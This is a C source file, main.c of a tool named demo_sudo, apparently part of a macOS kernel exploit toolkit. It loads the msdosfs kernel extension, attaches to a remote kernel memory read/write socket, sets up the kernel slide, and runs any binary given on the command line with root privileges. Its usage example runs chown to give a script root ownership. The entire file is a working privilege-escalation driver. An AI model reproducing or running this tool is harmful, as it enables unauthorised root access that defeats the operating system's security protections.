//
//  main.c
//  demo_sudo
//
//  Created by sreejith on 3/11/22.
//

#include <stdio.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/util/sudo.h>
#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/misc.h>
#include <xe/util/msdosfs.h>


int main(int argc, const char * argv[]) {
    if (argc < 3) {
        xe_log_error("invalid arguments");
        xe_log_info("usage: demo_sudo <path-to-kmem-socket> <path-to-binary> [arg1] [arg2] ...");
        xe_log_info("example: demo_sudo /tmp/xe_tDTYR4qq/socket /bin/chown root:admin ./test.sh");
        exit(1);
    }
    
    xe_util_msdosfs_loadkext();
    
    xe_log_debug("intializing kmem client");
    xe_kmem_backend_t backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    xe_log_debug("creating sudo utility");
    xe_util_sudo_t sudo = xe_util_sudo_create();
    
    const char* binary = argv[2];
    const char* args[argc - 3];
    for (int i=0; i<argc - 3; i++) {
        args[i] = argv[i + 3];
    }
    
    xe_log_info("running binary %s", binary);
    int exit_status = xe_util_sudo_run(sudo, binary, args, xe_array_size(args));
    if (exit_status) {
        xe_log_error("binary %s returned non zero exit status (status: %d)", binary, exit_status);
    } else {
        xe_log_info("successfully ran binary with root privileges");
    }
    
    xe_util_sudo_destroy(&sudo);
    return exit_status;
}
